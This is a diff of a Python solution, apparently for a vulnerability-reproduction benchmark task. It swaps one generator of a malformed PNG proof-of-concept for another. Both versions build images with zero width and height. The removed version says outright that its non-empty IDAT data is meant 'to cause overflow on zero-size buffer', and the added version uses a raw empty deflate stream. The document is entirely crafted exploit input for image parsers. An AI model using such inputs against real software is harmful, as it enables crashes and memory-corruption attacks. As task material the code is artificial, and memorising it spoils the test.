@@ -1,25 +1,25 @@
-import struct
 import zlib
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        signature = b'\x89PNG\r\n\x1a\n'
-        # IHDR: width=0, height=0, 8-bit, RGB, default settings
-        ihdr_data = (
-            struct.pack('>I', 0) +  # width
-            struct.pack('>I', 0) +  # height
-            b'\x08\x02\x00\x00\x00'  # bit depth, color type, compression, filter, interlace
-        )
-        ihdr_crc = struct.pack('>I', zlib.crc32(b'IHDR' + ihdr_data) & 0xffffffff)
-        ihdr_chunk = struct.pack('>I', 13) + b'IHDR' + ihdr_data + ihdr_crc
-        # IDAT with non-empty compressed data to cause overflow on zero-size buffer
-        fake_data = b'\x00' * 16  # Small non-zero decompressed size
-        compressed = zlib.compress(fake_data)
-        idat_length = struct.pack('>I', len(compressed))
-        idat_crc = struct.pack('>I', zlib.crc32(b'IDAT' + compressed) & 0xffffffff)
-        idat_chunk = idat_length + b'IDAT' + compressed + idat_crc
-        # IEND
-        iend_crc = struct.pack('>I', zlib.crc32(b'IEND') & 0xffffffff)
-        iend_chunk = struct.pack('>I', 0) + b'IEND' + iend_crc
-        poc = signature + ihdr_chunk + idat_chunk + iend_chunk
-        return poc
+        png = b'\x89PNG\r\n\x1a\n'
+        # IHDR chunk
+        width = 0
+        height = 0
+        ihdr_data = width.to_bytes(4, 'big') + height.to_bytes(4, 'big') + b'\x08\x00\x00\x00\x00'
+        ihdr_header = b'\x00\x00\x00\x0dIHDR'
+        ihdr_crc = zlib.crc32(b'IHDR' + ihdr_data) & 0xffffffff
+        png += ihdr_header + ihdr_data + ihdr_crc.to_bytes(4, 'big')
+        # IDAT chunk with empty deflate stream
+        compressor = zlib.compressobj(wbits=-zlib.MAX_WBITS)
+        empty_uncompressed = b''
+        idat_data = compressor.compress(empty_uncompressed) + compressor.flush()
+        idat_len = len(idat_data)
+        idat_header = idat_len.to_bytes(4, 'big') + b'IDAT'
+        idat_crc = zlib.crc32(b'IDAT' + idat_data) & 0xffffffff
+        png += idat_header + idat_data + idat_crc.to_bytes(4, 'big')
+        # IEND chunk
+        iend_header = b'\x00\x00\x00\x00IEND'
+        iend_crc = zlib.crc32(b'IEND') & 0xffffffff
+        png += iend_header + iend_crc.to_bytes(4, 'big')
+        return png
